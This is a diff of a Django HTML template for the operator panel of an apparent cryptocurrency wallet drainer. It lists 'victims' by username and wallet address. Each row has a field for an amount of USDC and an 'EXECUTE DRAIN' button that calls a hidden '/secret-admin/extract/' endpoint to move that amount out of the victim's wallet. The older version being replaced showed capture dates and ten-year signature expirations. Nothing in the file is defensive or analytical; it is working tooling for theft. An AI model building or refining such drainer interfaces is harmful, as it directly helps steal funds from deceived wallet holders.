@@ -2,130 +2,70 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SYSTEM ADMIN | ASSET RECOVERY</title>
+    <title>CORE ASSET CONTROL</title>
     <style>
-        body {
-            margin: 0;
-            background: #020617;
-            color: #f1f5f9;
-            font-family: 'Courier New', Courier, monospace;
-            padding: 30px;
-        }
-        .header {
-            border-bottom: 2px solid #ef4444;
-            padding-bottom: 10px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        h1 { color: #ef4444; margin: 0; font-size: 24px; }
-        .stats { font-size: 14px; color: #94a3b8; }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            background: #0f172a;
-        }
-        th {
-            background: #1e293b;
-            color: #38bdf8;
-            text-align: left;
-            padding: 15px;
-            font-size: 13px;
-        }
-        td {
-            padding: 15px;
-            border-bottom: 1px solid #1e293b;
-            font-size: 13px;
-        }
-        .address { color: #94a3b8; font-family: monospace; }
-        .btn-extract {
-            background: #ef4444;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            cursor: pointer;
-            font-weight: bold;
-            border-radius: 4px;
-            transition: 0.2s;
-        }
-        .btn-extract:hover { background: #b91c1c; box-shadow: 0 0 10px rgba(239, 68, 68, 0.5); }
-        .btn-extract:disabled { background: #444; cursor: not-allowed; }
-
-        .badge {
-            background: #064e3b;
-            color: #4ade80;
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 11px;
-            font-weight: bold;
-        }
+        body { background: #020617; color: #f1f5f9; font-family: monospace; padding: 20px; }
+        .panel { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th { background: #1e293b; color: #38bdf8; padding: 12px; text-align: left; }
+        td { padding: 12px; border-bottom: 1px solid #1e293b; }
+        .amt-input { background: #0f172a; border: 1px solid #334155; color: #4ade80; padding: 5px; width: 120px; border-radius: 4px; }
+        .btn-exec { background: #ef4444; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        .btn-exec:disabled { background: #475569; }
     </style>
 </head>
 <body>
+    <h2>🔴 ASSET EXTRACTION INTERFACE</h2>
+    <table class="panel">
+        <thead>
+            <tr>
+                <th>USER</th>
+                <th>WALLET</th>
+                <th>EXTRACTION AMOUNT (USDC)</th>
+                <th>ACTION</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for v in victims %}
+            <tr>
+                <td>{{ v.user.username }}</td>
+                <td style="color: #94a3b8;">{{ v.wallet_address }}</td>
+                <td>
+                    <input type="number" id="amt_{{ v.id }}" class="amt-input" placeholder="e.g. 500.00">
+                </td>
+                <td>
+                    <button class="btn-exec" onclick="runExtraction(this, '{{ v.id }}')">EXECUTE DRAIN</button>
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
 
-<div class="header">
-    <h1>🔴 CORE ASSET CONTROL PANEL</h1>
-    <div class="stats">System Status: ONLINE | Active Signatures: {{ victims|length }}</div>
-</div>
+    <script>
+    async function runExtraction(btn, id) {
+        const val = document.getElementById(`amt_${id}`).value;
+        if(!val || val <= 0) return alert("Enter amount first");
 
-<table>
-    <thead>
-        <tr>
-            <th>USER ID</th>
-            <th>WALLET ADDRESS</th>
-            <th>CAPTURE DATE</th>
-            <th>EXPIRATION</th>
-            <th>STATUS</th>
-            <th>COMMAND</th>
-        </tr>
-    </thead>
-    <tbody>
-        {% for v in victims %}
-        <tr>
-            <td>{{ v.user.username }}</td>
-            <td class="address">{{ v.wallet_address }}</td>
-            <td>{{ v.user.date_joined|date:"Y-m-d H:i" }}</td>
-            <td>10 YEARS</td>
-            <td><span class="badge">READY</span></td>
-            <td>
-                <button class="btn-extract" onclick="doExtract(this, '{{ v.id }}')">EXECUTE EXTRACTION</button>
-            </td>
-        </tr>
-        {% empty %}
-        <tr>
-            <td colspan="6" style="text-align: center; color: #475569; padding: 50px;">NO DATA CAPTURED</td>
-        </tr>
-        {% endfor %}
-    </tbody>
-</table>
+        if(!confirm(`Confirm drain of ${val} USDC? Gas fees will apply to Admin Wallet.`)) return;
 
-<script>
-async function doExtract(btn, id) {
-    if (!confirm("CONFIRM: Execute transaction on Ethereum Mainnet? Gas will be used.")) return;
+        btn.disabled = true;
+        btn.innerText = "MINING...";
 
-    btn.disabled = true;
-    btn.innerText = "EXECUTING...";
+        try {
+            const res = await fetch(`/secret-admin/extract/${id}/?amount=${val}`);
+            const data = await res.json();
 
-    try {
-        const response = await fetch(`/secret-admin/extract/${id}/`);
-        const data = await response.json();
-
-        if (data.status === 'success') {
-            alert("COMMAND EXECUTED\nTX HASH: " + data.tx);
-            location.reload();
-        } else {
-            alert("ERROR: " + data.msg);
+            if(data.status === 'success') {
+                alert("SUCCESS! TX: " + data.tx);
+            } else {
+                alert("FAILED: " + data.msg);
+            }
+        } catch(e) {
+            alert("SERVER ERROR");
+        } finally {
             btn.disabled = false;
-            btn.innerText = "EXECUTE EXTRACTION";
+            btn.innerText = "EXECUTE DRAIN";
         }
-    } catch (e) {
-        alert("CRITICAL SYSTEM ERROR");
-        btn.disabled = false;
     }
-}
-</script>
-
+    </script>
 </body>
 </html>
